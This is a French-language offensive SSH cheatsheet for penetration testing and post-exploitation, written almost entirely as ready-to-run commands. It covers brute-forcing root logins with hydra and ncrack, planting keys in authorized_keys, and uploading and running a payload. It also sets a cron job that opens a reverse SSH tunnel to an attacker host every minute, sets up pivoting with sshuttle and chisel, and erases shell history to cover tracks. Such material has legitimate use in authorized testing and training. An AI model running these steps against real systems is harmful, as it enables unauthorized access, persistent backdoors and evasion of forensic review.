# 🔐 SSH - Cheatsheet Cybersécurité / Post-Exploitation

Ce fichier est dédié à l’utilisation offensive de SSH : **scan**, **connexion**, **tunnel**, **rebond**, **exploitation**, **persistance**, et **pivoting réseau**.

---

## 🔍 1. Scan & Détection
```
nmap -p 22 <IP>  
```
> Scan du port SSH

nmap -p 22 --script ssh-hostkey,ssh2-enum-algos <IP>  
> Récupère les algos, versions, fingerprints

---

## 🔑 2. Connexion simple

ssh <user>@<ip>  
> Connexion avec mot de passe

ssh <user>@<ip> -i id_rsa  
> Connexion avec clé privée

ssh -p <port> <user>@<ip>  
> Connexion sur un port personnalisé

---

## 🧠 3. Exploitation de credentials

hydra -l root -P rockyou.txt ssh://<IP>  
> Bruteforce SSH

ncrack -p 22 --user root -P passwords.txt <IP>  
> Alternative rapide

searchsploit ssh  
> Recherche de vuln SSH (rare mais utile)

---

## 📂 4. Clés SSH

### 📤 Générer une clé

ssh-keygen -t rsa  
> Génère une paire de clés

### 📥 Ajouter une clé à une machine cible

cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys  
> Ajoute ta clé publique

scp ~/.ssh/id_rsa.pub user@target:~/.ssh/authorized_keys  
> Upload automatique

---

## 🧱 5. Tunnels SSH (Port Forwarding)

### 🔁 Local port forwarding (Accès distant localement)

ssh -L 9999:127.0.0.1:3306 user@target  
> Accède au port 3306 de la cible depuis `localhost:9999`

Exemple :  
`mysql -h 127.0.0.1 -P 9999 -u root -p`  
> Accède à MySQL sur la cible via tunnel

### ↔️ Remote port forwarding (Expose ton port local à la cible)

ssh -R 4444:127.0.0.1:4444 user@target  
> Le port 4444 de la cible est redirigé vers ton port local

### 🧬 Dynamic port forwarding (Proxy SOCKS5)

ssh -D 1080 user@target  
> Tunnel SOCKS5 à utiliser dans Burp/Firefox

---

## 🚪 6. Rebond SSH / Pivot (via un serveur SSH)

### 🔁 Cas 1 - Cible A → Pivot B → Toi

ssh -J user@pivot user@target  
> Rebond natif (avec OpenSSH 7.3+)

ssh -o ProxyJump=user@pivot user@target  
> Idem

### 🔁 Cas 2 - Tunnel manuel avec ProxyCommand

ssh -o "ProxyCommand nc -x 127.0.0.1:1080 %h %p" user@target  
> Utilise un proxy SOCKS vers une cible non accessible

---

## 🐚 7. Commande distante via SSH

ssh user@target 'id; whoami; uname -a'  
> Exécution directe

scp payload.sh user@target:/tmp/  
> Envoie d’un fichier

ssh user@target 'bash /tmp/payload.sh'  
> Exécution de payload

---

## 🧬 8. Maintien d'accès

### 💾 Drop de clé persistante

echo "clé_publique" >> ~/.ssh/authorized_keys  
> Accès durable

### 📅 Tâche cron pour reverse SSH

echo "* * * * * ssh -R 2222:localhost:22 user@attacker_ip" | crontab -  
> Crée un accès inversé chaque minute

---

## 📈 9. Pivoting & Post-Exploitation

### 🌐 SSHuttle (auto routing via SSH)

sshuttle -r user@target 0.0.0.0/0  
> Proxy transparent : tout le trafic passe par la cible

### 🧩 Chisel (Tunnel TCP/HTTP)

# Sur Attaquant  
chisel server -p 8000 --reverse

# Sur Cible  
chisel client <IP>:8000 R:127.0.0.1:2222:127.0.0.1:22

> Permet de rebondir même si SSH n’est pas exposé

---

## 🧹 10. Nettoyage

rm ~/.ssh/authorized_keys  
> Supprime ton accès

history -c  
> Nettoie l’historique (à utiliser prudemment)

crontab -r  
> Supprime toutes les tâches planifiées

---

## 🛠 11. Outils SSH utiles

- `ssh-audit`  
> Audit des algorithmes SSH

- `sshuttle`  
> Pivot réseau transparent

- `chisel`  
> Rebond rapide via HTTP tunnel

- `hydra`, `ncrack`  
> Bruteforce SSH

- `proxychains`  
> Rediriger le trafic via un pivot

---

## 📚 12. Ressources utiles

- [HackTricks - SSH](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
- [PayloadsAllTheThings - SSH](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/SSH)
- [SSHuttle GitHub](https://github.com/sshuttle/sshuttle)
